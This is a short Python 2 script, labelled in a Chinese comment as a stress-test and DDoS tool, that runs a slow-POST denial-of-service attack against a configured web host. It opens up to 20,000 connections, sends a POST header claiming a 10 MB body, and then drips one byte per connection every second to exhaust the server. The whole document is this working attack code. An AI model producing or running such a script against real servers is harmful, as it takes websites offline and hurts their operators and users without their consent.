import sys
import struct
import socket
import time
import threading
#压力测试，ddos工具
#----------------------------------
MAX_CONN = 20000
PORT = 80
HOST = "www.abcde.com"
PAGE = "/index.php"
#----------------------------------
 
buf=("POST %s HTTP/1.1\r\n"
"Host: %s\r\n"
"Content-Length: 10000000\r\n"
"Cookie: dklkt_dos_test\r\n"
"\r\n" % (PAGE,HOST))
 
socks = []
 
def conn_thread():
    global socks
    for i in range(0,MAX_CONN):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST,PORT))
            s.send(buf)
            print "Send buf ok! conn=%d\n"%i
            socks.append(s)
        except Exception,e:
            print "Could not connect to server or send error:%s"%e
            time.sleep(10)
            #sys.exit(0)
#end def
 
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f")
                #print "sendok!"
            except Exception,e:
                print "Send Exception:%s\n"%e
                socks.remove(s)
                s.close()
 
        time.sleep(1)
#end def
 
conn_th=threading.Thread(target=conn_thread,args=())
send_th=threading.Thread(target=send_thread,args=())
 
conn_th.start()
send_th.start()
